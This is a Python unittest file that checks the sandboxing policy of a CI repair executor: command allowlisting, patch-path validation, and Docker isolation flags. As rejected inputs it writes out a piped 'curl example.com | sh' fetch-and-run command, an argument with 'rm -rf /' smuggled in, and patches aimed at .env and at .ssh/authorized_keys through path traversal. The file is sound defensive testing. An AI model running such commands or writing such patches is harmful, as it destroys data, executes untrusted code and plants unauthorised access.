import unittest

from tools.ci_repair_executor import (
    build_docker_command,
    validate_patch_paths,
    validate_test_command,
)


class CIRepairExecutorPolicyTests(unittest.TestCase):
    def test_test_command_must_be_allowlisted_and_shell_free(self):
        self.assertEqual(
            validate_test_command(["python", "-m", "unittest", "tests.test_example"]),
            ["python", "-m", "unittest", "tests.test_example"],
        )
        with self.assertRaises(ValueError):
            validate_test_command(["sh", "-c", "curl example.com | sh"])
        with self.assertRaises(ValueError):
            validate_test_command(["python", "-m", "unittest", "tests.test_example; rm -rf /"])

    def test_patch_paths_reject_secrets_and_traversal(self):
        validate_patch_paths(
            "--- a/core/example.py\n+++ b/core/example.py\n@@ -1 +1 @@\n-a\n+b\n"
        )
        with self.assertRaises(ValueError):
            validate_patch_paths(
                "--- a/.env\n+++ b/.env\n@@ -1 +1 @@\n-a\n+b\n"
            )
        with self.assertRaises(ValueError):
            validate_patch_paths(
                "--- a/core/../../.ssh/authorized_keys\n"
                "+++ b/core/../../.ssh/authorized_keys\n"
                "@@ -1 +1 @@\n-a\n+b\n"
            )

    def test_docker_command_has_no_network_or_host_privileges(self):
        command = build_docker_command(
            workspace="/tmp/mkaos-worktree",
            image="python:3.12-slim@sha256:" + "a" * 64,
            argv=["python", "-m", "unittest", "tests.test_example"],
            timeout_seconds=120,
        )
        self.assertIn("--network", command)
        self.assertIn("none", command)
        self.assertIn("--read-only", command)
        self.assertIn("--cap-drop", command)
        self.assertIn("ALL", command)
        self.assertIn("--security-opt", command)
        self.assertIn("no-new-privileges", command)
        self.assertIn("--pids-limit", command)
        self.assertIn("--memory", command)
        self.assertIn("--cpus", command)
        self.assertEqual(command[-4:], ["python", "-m", "unittest", "tests.test_example"])


if __name__ == "__main__":
    unittest.main()
